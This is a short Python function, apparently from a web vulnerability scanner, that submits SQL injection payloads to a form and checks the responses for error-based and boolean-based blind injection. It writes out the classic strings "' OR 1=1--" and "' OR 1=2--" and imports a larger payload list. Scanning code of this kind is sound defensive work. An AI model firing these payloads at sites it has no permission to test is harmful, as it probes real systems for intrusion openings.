from core.payloads import SQLI_PAYLOADS
from core.analyzer import detect_sqli, boolean_based_check
from core.injector import inject

def scan_sqli(url, form):
    results = []

    # Error-based SQLi
    for payload in SQLI_PAYLOADS:
        resp = inject(url, form, payload)
        if detect_sqli(resp):
            results.append(("SQL Injection", form["action"], payload))

    # Boolean-based SQLi
    resp_true = inject(url, form, "' OR 1=1--")
    resp_false = inject(url, form, "' OR 1=2--")

    if boolean_based_check(resp_true, resp_false):
        results.append(("Blind SQL Injection", form["action"], "Boolean Based"))

    return results